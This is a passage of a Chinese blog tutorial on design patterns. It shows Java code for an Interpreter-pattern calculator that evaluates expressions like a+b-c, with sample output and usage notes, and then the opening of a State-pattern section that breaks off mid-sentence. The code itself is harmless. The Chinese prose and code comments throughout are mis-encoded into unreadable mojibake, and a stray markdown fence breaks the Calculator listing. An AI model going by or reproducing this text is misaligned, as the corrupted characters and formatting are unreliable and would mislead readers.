Client è¾“å…¥å³å¯</p></li></ol><h2 id="å®ç°-17"><a class="markdownIt-Anchor" href="#å®ç°-17"></a> å®ç°</h2><p>åº”ç”¨å®ä¾‹è¦æ±‚</p><p>é€šè¿‡è§£é‡Šå™¨æ¨¡å¼æ¥å®ç°å››åˆ™è¿ç®—ï¼Œ</p><p>å¦‚è®¡ç®— a+b-c çš„å€¼</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104185525137.png" alt="image-20230104185525137" /></p><p><code>AddExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åŠ æ³•è§£é‡Šå™¨</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SymbolExpression</span>  &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">AddExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">super</span>(left, right);<br>   &#125;<br><br>   <span class="hljs-comment">//å¤„ç†ç›¸åŠ </span><br>   <span class="hljs-comment">//var ä»ç„¶æ˜¯ &#123;a=10,b=20&#125;..</span><br>   <span class="hljs-comment">//ä¸€ä¼šæˆ‘ä»¬debug æºç ,å°±ok</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">//super.left.interpreter(var) ï¼š è¿”å› left è¡¨è¾¾å¼å¯¹åº”çš„å€¼ a = 10</span><br>      <span class="hljs-comment">//super.right.interpreter(var): è¿”å›right è¡¨è¾¾å¼å¯¹åº”å€¼ b = 20</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.left.interpreter(<span class="hljs-keyword">var</span>) + <span class="hljs-built_in">super</span>.right.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Calculator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Stack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br><br>   <span class="hljs-comment">// å®šä¹‰è¡¨è¾¾å¼</span><br>   <span class="hljs-keyword">private</span> Expression expression;<br><br>   <span class="hljs-comment">// æ„é€ å‡½æ•°ä¼ å‚ï¼Œå¹¶è§£æ</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calculator</span><span class="hljs-params">(String expStr)</span> &#123; <span class="hljs-comment">// expStr = a+b</span><br>      <span class="hljs-comment">// å®‰æ’è¿ç®—å…ˆåé¡ºåº</span><br>      Stack&lt;Expression&gt; stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>      <span class="hljs-comment">// è¡¨è¾¾å¼æ‹†åˆ†æˆå­—ç¬¦æ•°ç»„ </span><br>      <span class="hljs-type">char</span>[] charArray = expStr.toCharArray();<span class="hljs-comment">// [a, +, b]</span><br><br>      <span class="hljs-type">Expression</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">Expression</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-comment">//éå†æˆ‘ä»¬çš„å­—ç¬¦æ•°ç»„ï¼Œ å³éå†  [a, +, b]</span><br>      <span class="hljs-comment">//é’ˆå¯¹ä¸åŒçš„æƒ…å†µï¼Œåšå¤„ç†</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; charArray.length; i++) &#123;<br>         <span class="hljs-keyword">switch</span> (charArray[i]) &#123;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>: <span class="hljs-comment">//</span><br>            left = stack.pop();<span class="hljs-comment">// ä»stackå–å‡ºleft =&gt; &quot;a&quot;</span><br>            right = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[++i]));<span class="hljs-comment">// å–å‡ºå³è¡¨è¾¾å¼ &quot;b&quot;</span><br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AddExpression</span>(left, right));<span class="hljs-comment">// ç„¶åæ ¹æ®å¾—åˆ°left å’Œ right æ„å»º AddExpressonåŠ å…¥stack</span><br>            <span class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>: <span class="hljs-comment">// </span><br>            left = stack.pop();<br>            right = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[++i]));<br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubExpression</span>(left, right));<br>            <span class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">default</span>: <br>            <span class="hljs-comment">//å¦‚æœæ˜¯ä¸€ä¸ª Var å°±åˆ›å»ºè¦ç»™ VarExpression å¯¹è±¡ï¼Œå¹¶pushåˆ° stack</span><br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[i])));<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125;<br>      <span class="hljs-comment">//å½“éå†å®Œæ•´ä¸ª charArray æ•°ç»„åï¼Œstack å°±å¾—åˆ°æœ€åExpression</span><br>      <span class="hljs-built_in">this</span>.expression = stack.pop();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">//æœ€åå°†è¡¨è¾¾å¼a+bå’Œ var = &#123;a=10,b=20&#125;</span><br>      <span class="hljs-comment">//ç„¶åä¼ é€’ç»™expressionçš„interpreterè¿›è¡Œè§£é‡Šæ‰§è¡Œ</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.expression.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;```<br>`Client.java`<br>â€‹```java<br><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">expStr</span> <span class="hljs-operator">=</span> getExpStr(); <span class="hljs-comment">// a+b</span><br>      HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span> = getValue(expStr);<span class="hljs-comment">// var &#123;a=10, b=20&#125;</span><br>      <span class="hljs-type">Calculator</span> <span class="hljs-variable">calculator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(expStr);<br>      System.out.println(<span class="hljs-string">&quot;è¿ç®—ç»“æœï¼š&quot;</span> + expStr + <span class="hljs-string">&quot;=&quot;</span> + calculator.run(<span class="hljs-keyword">var</span>));<br>   &#125;<br><br>   <span class="hljs-comment">// è·å¾—è¡¨è¾¾å¼</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getExpStr</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥è¡¨è¾¾å¼ï¼š&quot;</span>);<br>      <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in))).readLine();<br>   &#125;<br><br>   <span class="hljs-comment">// è·å¾—å€¼æ˜ å°„</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;String, Integer&gt; <span class="hljs-title function_">getValue</span><span class="hljs-params">(String expStr)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      HashMap&lt;String, Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : expStr.toCharArray()) &#123;<br>         <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;+&#x27;</span> &amp;&amp; ch != <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!map.containsKey(String.valueOf(ch))) &#123;<br>               System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥&quot;</span> + String.valueOf(ch) + <span class="hljs-string">&quot;çš„å€¼ï¼š&quot;</span>);<br>               <span class="hljs-type">String</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in))).readLine();<br>               map.put(String.valueOf(ch), Integer.valueOf(in));<br>            &#125;<br>         &#125;<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> map;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Expression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æŠ½è±¡ç±»è¡¨è¾¾å¼ï¼Œé€šè¿‡HashMap é”®å€¼å¯¹, å¯ä»¥è·å–åˆ°å˜é‡çš„å€¼</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Expression</span> &#123;<br>   <span class="hljs-comment">// a + b - c</span><br>   <span class="hljs-comment">// è§£é‡Šå…¬å¼å’Œæ•°å€¼, key å°±æ˜¯å…¬å¼(è¡¨è¾¾å¼) å‚æ•°[a,b,c], valueå°±æ˜¯å°±æ˜¯å…·ä½“å€¼</span><br>   <span class="hljs-comment">// HashMap &#123;a=10, b=20&#125;</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SubExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SymbolExpression</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SubExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">super</span>(left, right);<br>   &#125;<br><br>   <span class="hljs-comment">//æ±‚å‡ºleft å’Œ right è¡¨è¾¾å¼ç›¸å‡åçš„ç»“æœ</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.left.interpreter(<span class="hljs-keyword">var</span>) - <span class="hljs-built_in">super</span>.right.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SymbolExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æŠ½è±¡è¿ç®—ç¬¦å·è§£æå™¨ è¿™é‡Œï¼Œæ¯ä¸ªè¿ç®—ç¬¦å·ï¼Œéƒ½åªå’Œè‡ªå·±å·¦å³ä¸¤ä¸ªæ•°å­—æœ‰å…³ç³»ï¼Œ</span><br><span class="hljs-comment"> * ä½†å·¦å³ä¸¤ä¸ªæ•°å­—æœ‰å¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªè§£æçš„ç»“æœï¼Œæ— è®ºä½•ç§ç±»å‹ï¼Œéƒ½æ˜¯Expressionç±»çš„å®ç°ç±»</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SymbolExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Expression</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> Expression left;<br>   <span class="hljs-keyword">protected</span> Expression right;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SymbolExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">this</span>.left = left;<br>      <span class="hljs-built_in">this</span>.right = right;<br>   &#125;<br><br>   <span class="hljs-comment">//å› ä¸º SymbolExpression æ˜¯è®©å…¶å­ç±»æ¥å®ç°ï¼Œå› æ­¤ interpreter æ˜¯ä¸€ä¸ªé»˜è®¤å®ç°</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>VarExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å˜é‡çš„è§£é‡Šå™¨</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VarExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Expression</span> &#123;<br><br>   <span class="hljs-keyword">private</span> String key; <span class="hljs-comment">// key=a,key=b,key=c</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">VarExpression</span><span class="hljs-params">(String key)</span> &#123;<br>      <span class="hljs-built_in">this</span>.key = key;<br>   &#125;<br><br>   <span class="hljs-comment">// var å°±æ˜¯&#123;a=10, b=20&#125;</span><br>   <span class="hljs-comment">// interpreter æ ¹æ® å˜é‡åç§°ï¼Œè¿”å›å¯¹åº”å€¼</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">var</span>.get(<span class="hljs-built_in">this</span>.key);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">è¯·è¾“å…¥è¡¨è¾¾å¼ï¼š<span class="hljs-keyword">a</span>+b-c<br>è¯·è¾“å…¥<span class="hljs-keyword">a</span>çš„å€¼ï¼š<span class="hljs-number">10</span><br>è¯·è¾“å…¥bçš„å€¼ï¼š<span class="hljs-number">1</span><br>è¯·è¾“å…¥cçš„å€¼ï¼š<span class="hljs-number">5</span><br>è¿ç®—ç»“æœï¼š<span class="hljs-keyword">a</span>+b-c=<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h2 id="è§£é‡Šå™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#è§£é‡Šå™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> è§£é‡Šå™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>å½“æœ‰ä¸€ä¸ªè¯­è¨€éœ€è¦è§£é‡Šæ‰§è¡Œï¼Œå¯å°†è¯¥è¯­è¨€ä¸­çš„å¥å­è¡¨ç¤ºä¸ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ï¼Œå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨è§£é‡Šå™¨æ¨¡å¼ï¼Œè®©ç¨‹åºå…·æœ‰è‰¯å¥½çš„æ‰©å±•æ€§</p></li><li><p>åº”ç”¨åœºæ™¯ï¼šç¼–è¯‘å™¨ã€è¿ç®—è¡¨è¾¾å¼è®¡ç®—ã€æ­£åˆ™è¡¨è¾¾å¼ã€æœºå™¨äººç­‰</p></li><li><p>ä½¿ç”¨è§£é‡Šå™¨å¯èƒ½å¸¦æ¥çš„é—®é¢˜ï¼šè§£é‡Šå™¨æ¨¡å¼ä¼šå¼•èµ·ç±»è†¨èƒ€ã€è§£é‡Šå™¨æ¨¡å¼é‡‡ç”¨é€’å½’è°ƒç”¨æ–¹æ³•ï¼Œå°†ä¼šå¯¼è‡´è°ƒè¯•éå¸¸å¤æ‚ã€æ•ˆç‡å¯èƒ½é™ä½</p></li></ol><h1 id="çŠ¶æ€æ¨¡å¼"><a class="markdownIt-Anchor" href="#çŠ¶æ€æ¨¡å¼"></a> çŠ¶æ€æ¨¡å¼</h1><p>åœ¨çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼‰ä¸­ï¼Œç±»çš„è¡Œä¸ºæ˜¯åŸºäºå®ƒçš„çŠ¶æ€æ”¹å˜çš„ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-20"><a class="markdownIt-Anchor" href="#ä»‹ç»-20"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å…è®¸å¯¹è±¡åœ¨å†…éƒ¨çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œå¯¹è±¡çœ‹èµ·æ¥å¥½åƒä¿®æ”¹äº†å®ƒçš„ç±»ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> å¯¹è±¡çš„è¡Œä¸ºä¾èµ–äºå®ƒçš„çŠ¶æ€ï¼ˆå±æ€§ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®å®ƒçš„çŠ¶æ€æ”¹å˜è€Œæ”¹å˜å®ƒçš„ç›¸å…³è¡Œä¸ºã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> ä»£ç ä¸­åŒ…å«å¤§é‡ä¸å¯¹è±¡çŠ¶æ€æœ‰å…³çš„æ¡ä»¶è¯­å¥ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†å„ç§å…·ä½“çš„çŠ¶æ€ç±»æŠ½è±¡å‡ºæ¥ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong><br />é€šå¸¸å‘½ä»¤æ¨¡å¼çš„æ¥å£ä¸­åªæœ‰ä¸€ä¸ªæ–¹æ³•ã€‚è€ŒçŠ¶æ€æ¨¡å¼çš„æ¥å£ä¸­æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–¹æ³•ã€‚è€Œä¸”ï¼ŒçŠ¶æ€æ¨¡å¼çš„å®ç°ç±»çš„æ–¹æ³•ï¼Œä¸€èˆ¬è¿”å›å€¼ï¼Œæˆ–è€…æ˜¯æ”¹å˜å®ä¾‹å˜é‡çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒçŠ¶æ€æ¨¡å¼ä¸€èˆ¬å’Œå¯¹è±¡çš„çŠ¶æ€æœ‰å…³ã€‚å®ç°ç±»çš„æ–¹æ³•æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œè¦†ç›–æ¥å£ä¸­çš„æ–¹æ³•ã€‚çŠ¶æ€æ¨¡å¼å’Œå‘½ä»¤æ¨¡å¼ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ¶ˆé™¤<br />ifâ€¦else ç­‰æ¡ä»¶é€‰æ‹©è¯­å¥ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€æ‰“ç¯®çƒçš„æ—¶å€™è¿åŠ¨å‘˜å¯ä»¥æœ‰æ­£å¸¸çŠ¶æ€ã€ä¸æ­£å¸¸çŠ¶æ€å’Œè¶…å¸¸çŠ¶æ€ã€‚<br />2ã€æ›¾ä¾¯ä¹™ç¼–é’Ÿä¸­ï¼Œâ€˜é’Ÿæ˜¯æŠ½è±¡æ¥å£â€™,'é’ŸAâ€™ç­‰æ˜¯å…·ä½“çŠ¶æ€ï¼Œ'æ›¾ä¾¯ä¹™ç¼–é’Ÿâ€™æ˜¯å…·ä½“ç¯å¢ƒï¼ˆContextï¼‰ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å°è£…äº†è½¬æ¢è§„åˆ™ã€‚ 2ã€æšä¸¾å¯èƒ½çš„çŠ¶æ€ï¼Œåœ¨æšä¸¾çŠ¶æ€ä¹‹å‰éœ€è¦ç¡®å®šçŠ¶æ€ç§ç±»ã€‚<br />3ã€å°†æ‰€æœ‰ä¸æŸä¸ªçŠ¶æ€æœ‰å…³çš„è¡Œä¸ºæ”¾åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œå¹¶ä¸”å¯ä»¥æ–¹ä¾¿åœ°å¢åŠ æ–°çš„çŠ¶æ€ï¼Œåªéœ€è¦æ”¹å˜å¯¹è±¡çŠ¶æ€å³å¯æ”¹å˜å¯¹è±¡çš„è¡Œä¸ºã€‚<br />4ã€å…è®¸çŠ¶æ€è½¬æ¢é€»è¾‘ä¸çŠ¶æ€å¯¹è±¡åˆæˆä¸€ä½“ï¼Œè€Œä¸æ˜¯æŸä¸€ä¸ªå·¨å¤§çš„æ¡ä»¶è¯­å¥å—ã€‚ 5ã€å¯ä»¥è®©å¤šä¸ªç¯å¢ƒå¯¹è±¡å…±äº«ä¸€ä¸ªçŠ¶æ€å¯¹è±¡ï¼Œä»è€Œå‡å°‘ç³»ç»Ÿä¸­å¯¹è±¡çš„ä¸ªæ•°ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€çŠ¶æ€æ¨¡å¼çš„ä½¿ç”¨å¿…ç„¶ä¼šå¢åŠ ç³»ç»Ÿç±»å’Œå¯¹è±¡çš„ä¸ªæ•°ã€‚ 2ã€çŠ¶æ€æ¨¡å¼çš„ç»“æ„ä¸å®ç°éƒ½è¾ƒä¸ºå¤æ‚ï¼Œå¦‚æœä½¿ç”¨ä¸å½“å°†å¯¼è‡´ç¨‹åºç»“æ„å’Œä»£ç çš„æ··ä¹±ã€‚<br />3ã€çŠ¶æ€æ¨¡å¼å¯¹&quot;å¼€é—­åŸåˆ™&quot;çš„æ”¯æŒå¹¶ä¸å¤ªå¥½ï¼Œå¯¹äºå¯ä»¥åˆ‡æ¢çŠ¶æ€çš„çŠ¶æ€æ¨¡å¼ï¼Œå¢åŠ 